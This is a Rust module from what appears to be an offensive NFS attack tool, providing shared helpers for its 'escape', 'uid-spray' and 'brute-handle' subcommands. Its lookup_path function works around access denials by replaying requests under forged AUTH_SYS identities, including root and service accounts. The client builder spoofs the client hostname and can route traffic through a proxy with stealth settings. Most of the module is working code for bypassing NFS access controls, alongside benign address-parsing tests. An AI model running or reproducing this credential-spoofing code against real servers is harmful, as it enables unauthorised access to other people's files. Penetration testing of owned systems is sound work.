//! Shared connection / lookup helpers used by the offensive subcommands
//! (`escape`, `uid-spray`, `brute-handle`).
//!
//! These are pulled out of the individual subcommand files because all
//! three need the same primitives: parse a `<TARGET>` into a `SocketAddr`,
//! build a pool-backed `Nfs3Client` with a chosen credential, and walk a
//! path with credential escalation on `NFS3ERR_ACCES`.

use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;

use anyhow::Context as _;

use crate::cli::GlobalOpts;
use crate::engine::credential::escalation_list;
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::circuit::CircuitBreaker;
use crate::proto::conn::ReconnectStrategy;
use crate::proto::mount::NfsMountClient;
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::proto::pool::{ConnectionPool, PoolKey};
use crate::util::stealth::StealthConfig;

/// Build a MOUNT client honouring the global `--mount-port`,
/// `--privileged-port`, and `--proxy` flags.
///
/// Used by every subcommand that calls `MNT` (escape, shell, mount,
/// uid-spray, brute-handle) so the same flags propagate everywhere.
pub fn make_mount_client(globals: &GlobalOpts) -> NfsMountClient {
    let mut base = globals.mount_port.map_or_else(NfsMountClient::new, NfsMountClient::with_port);
    if let Some(ref p) = globals.proxy {
        base = base.with_proxy(p.clone());
    }
    if globals.privileged_port { base.require_privileged() } else { base }
}

/// Parse a host string into a `SocketAddr` using the default NFS port (2049).
///
/// Thin wrapper over [`parse_addr_with_port`] with no `--nfs-port` override,
/// kept with a stable signature for callers that do not thread the global
/// flag (e.g. `scan`).
///
/// Accepts the same `<TARGET>` shapes as the rest of the CLI:
/// `host`, `host:port`, `host:/export` (export portion ignored here), and
/// IPv6 literals (bare `2001:db8::1` or bracketed `[2001:db8::1]` / `[..]:port`).
pub fn parse_addr(host: &str) -> anyhow::Result<SocketAddr> {
    parse_addr_with_port(host, None)
}

/// Parse a host string into a `SocketAddr`, honouring an optional NFS-port override.
///
/// `nfs_port` is the global `--nfs-port` value: `Some(p)` overrides the default
/// 2049 so escape / uid-spray / brute-handle / shell can reach NFS on a fixed
/// port when portmapper (TCP/111) is firewalled; `None` falls back to 2049.
///
/// IPv6 literals need brackets before a port can be appended -- `SocketAddr`
/// rejects an unbracketed `2001:db8::1:2049` -- so the address is built
/// structurally from a parsed `IpAddr` rather than via string formatting.
pub fn parse_addr_with_port(host: &str, nfs_port: Option<u16>) -> anyhow::Result<SocketAddr> {
    let port = nfs_port.unwrap_or(2049);
    // Strip an optional `:/export` suffix so the colon-form target works
    // wherever a bare host did before. IPv6 literals use `::`, never `:/`,
    // so this never splits inside a v6 address.
    let host = host.find(":/").map_or(host, |idx| &host[..idx]);
    // Try direct parse first: handles `host:port` and bracketed `[ipv6]:port`,
    // preserving an explicitly-supplied port.
    if let Ok(addr) = host.parse::<SocketAddr>() {
        return Ok(addr);
    }
    // Bare IPv4 / IPv6 literal: build the address from the parsed IP so an IPv6
    // literal does not need manual bracketing (the old `format!` path produced
    // the unparseable `2001:db8::1:2049`).
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Ok(SocketAddr::new(ip, port));
    }
    // Bracketed IPv6 without a port (`[2001:db8::1]`): strip the brackets.
    if let Some(ip) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')).and_then(|inner| inner.parse::<IpAddr>().ok()) {
        return Ok(SocketAddr::new(ip, port));
    }
    // IPv4-or-hostname without a port -- append the chosen port (preserves the
    // original error context for unparseable hosts).
    format!("{host}:{port}").parse::<SocketAddr>().with_context(|| format!("invalid host: {host}"))
}

/// Build an `Nfs3Client` for the given host, export, and AUTH_SYS credential.
///
/// When `proxy` is `Some`, the connection pool tunnels all TCP through the
/// SOCKS5 proxy. When `nfs_port` is `Some(p)` (the global `--nfs-port`
/// override), the client connects directly to NFS port `p`, bypassing
/// portmapper GETPORT -- needed when TCP/111 is firewalled and the operator
/// knows the fixed NFS port. `None` resolves the NFS port via portmapper as
/// before. Handles are bearer tokens (RFC 1094 S2.3.3) obtained from the
/// separate MOUNT step, so the direct client needs no MOUNT of its own.
pub fn make_client(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig, proxy: Option<&str>, nfs_port: Option<u16>) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    make_client_with_hostname(addr, export, uid, gid, aux_gids, stealth, proxy, nfs_port, "nfswolf")
}

/// Like [`make_client`] but honouring the operator's spoofed `--hostname`
/// (`globals.hostname`) as the AUTH_SYS machinename.
///
/// The hostname is the client identity some servers key export ACLs on, and
/// `auth_unix.machinename` carries it on the wire (F-1.4).  Offensive
/// subcommands (escape / brute-handle / uid-spray) should pass
/// `&globals.hostname` here so the spoof is honoured the same way `shell`,
/// `mount` and `analyze` already do, rather than the fixed `"nfswolf"` literal
/// the convenience [`make_client`] wrapper uses.
pub fn make_client_with_hostname(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig, proxy: Option<&str>, nfs_port: Option<u16>, hostname: &str) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    let pool = Arc::new(match proxy {
        Some(p) => ConnectionPool::with_proxy(p.to_owned()),
        None => ConnectionPool::default_config(),
    });
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(gid, aux_gids);
    let auth = AuthSys::with_groups(uid, gid, &gids, hostname);
    let cred = Credential::Sys(auth);
    let key = PoolKey { host: addr, export: export.to_owned(), uid, gid };
    let client = match nfs_port {
        Some(p) => Nfs3Client::new_direct(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent, p),
        None => Nfs3Client::new(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent),
    };
    (pool, circuit, client)
}

/// Build the GID list for AUTH_SYS: primary GID first, then aux GIDs (deduped).
///
/// Public so the shell, mount, and FUSE adapters can build the same shape
/// of `gids` vector when constructing `AuthSys::with_groups`.
pub fn build_gid_list(gid: u32, aux_gids: &[u32]) -> Vec<u32> {
    let mut gids = vec![gid];
    for &g in aux_gids {
        if !gids.contains(&g) {
            gids.push(g);
        }
    }
    gids
}

/// Walk a path component-by-component from a root handle, retrying with
/// escalated credentials on `NFS3ERR_ACCES`.
///
/// The escalation ladder mirrors the one the shell and FUSE adapter use
/// (see `engine::credential::escalation_list`): owner first, then root,
/// then well-known service accounts. File handles are bearer tokens
/// (RFC 1094 S2.3.3), so every successful escalation produces a handle
/// the caller can use with any later credential.
pub async fn lookup_path(client: &Nfs3Client, root: &FileHandle, path: &str) -> anyhow::Result<FileHandle> {
    use nfs3_types::nfs3::{LOOKUP3args, Nfs3Result, diropargs3, filename3, nfsstat3};

    let components: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    let mut current = root.clone();

    for component in components {
        let args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(component.as_bytes()) } };
        let res = client.lookup(&args).await?;
        match res {
            Nfs3Result::Ok(ok) => {
                current = FileHandle::from_nfs_fh3(&ok.object);
            },
            Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES, _)) => {
                let owner_uid = get_owner_uid(client, &current).await;
                let try_uids = escalation_list((client.uid(), client.gid()), owner_uid);

                let mut resolved = false;
                for (uid, gid) in &try_uids {
                    // Preserve the client's spoofed machinename across the
                    // escalation ladder (F-1.4) instead of resetting it to a
                    // fixed literal -- so an operator's --hostname survives.
                    let esc_client = client.with_credential(Credential::Sys(AuthSys::with_groups(*uid, *gid, &[*gid], client.machinename())), *uid, *gid);
                    let esc_args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(component.as_bytes()) } };
                    if let Ok(Nfs3Result::Ok(ok)) = esc_client.lookup(&esc_args).await {
                        tracing::debug!(component, uid, gid, "LOOKUP succeeded with escalated credential");
                        current = FileHandle::from_nfs_fh3(&ok.object);
                        resolved = true;
                        break;
                    }
                }
                if !resolved {
                    anyhow::bail!("LOOKUP {component}: NFS3ERR_ACCES (tried {} credentials)", try_uids.len());
                }
            },
            Nfs3Result::Err((stat, _)) => {
                anyhow::bail!("LOOKUP {component}: {stat:?}");
            },
        }
    }

    Ok(current)
}

/// Get the owner (uid, gid) of a file/directory handle via GETATTR.
/// Returns `None` on any error (best-effort).
async fn get_owner_uid(client: &Nfs3Client, fh: &FileHandle) -> Option<(u32, u32)> {
    use nfs3_types::nfs3::{GETATTR3args, Nfs3Result};
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(Nfs3Result::Ok(ok)) => Some((ok.obj_attributes.uid, ok.obj_attributes.gid)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_addr_ipv4_default_port() {
        assert_eq!(parse_addr("192.168.1.10").unwrap(), "192.168.1.10:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_ipv4_with_export_strips_suffix() {
        // The `:/export` portion is irrelevant to the socket address.
        assert_eq!(parse_addr("192.168.1.10:/srv").unwrap(), "192.168.1.10:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_ipv4_explicit_port_preserved() {
        // An explicit `host:port` wins over the default.
        assert_eq!(parse_addr("192.168.1.10:12049").unwrap().port(), 12049);
    }

    #[test]
    fn parse_addr_bare_ipv6_literal() {
        // A bare IPv6 literal must NOT be string-formatted as `host:2049`
        // (that yields the unparseable `2001:db8::1:2049`); it gets the
        // default NFS port structurally.
        assert_eq!(parse_addr("2001:db8::1").unwrap(), "[2001:db8::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_bracketed_ipv6_with_port() {
        assert_eq!(parse_addr("[2001:db8::1]:2049").unwrap(), "[2001:db8::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_bracketed_ipv6_without_port() {
        assert_eq!(parse_addr("[2001:db8::1]").unwrap(), "[2001:db8::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_ipv6_loopback_with_export() {
        assert_eq!(parse_addr("[::1]:/export").unwrap(), "[::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_with_port_override_applies_to_ipv4_and_ipv6() {
        // The --nfs-port override replaces the default 2049 for bare hosts.
        assert_eq!(parse_addr_with_port("192.168.1.10", Some(20490)).unwrap().port(), 20490);
        assert_eq!(parse_addr_with_port("2001:db8::1", Some(20490)).unwrap(), "[2001:db8::1]:20490".parse().unwrap());
    }

    #[test]
    fn parse_addr_with_port_none_is_default() {
        // `None` keeps the historical default so `scan` and other unthreaded
        // callers are unaffected.
        assert_eq!(parse_addr_with_port("192.168.1.10", None).unwrap().port(), 2049);
    }

    #[test]
    fn parse_addr_invalid_host_errors() {
        assert!(parse_addr("not a host").is_err());
    }

    #[test]
    fn build_gid_list_puts_primary_first_and_dedups() {
        assert_eq!(build_gid_list(42, &[42, 7, 7, 9]), vec![42, 7, 9]);
    }
}
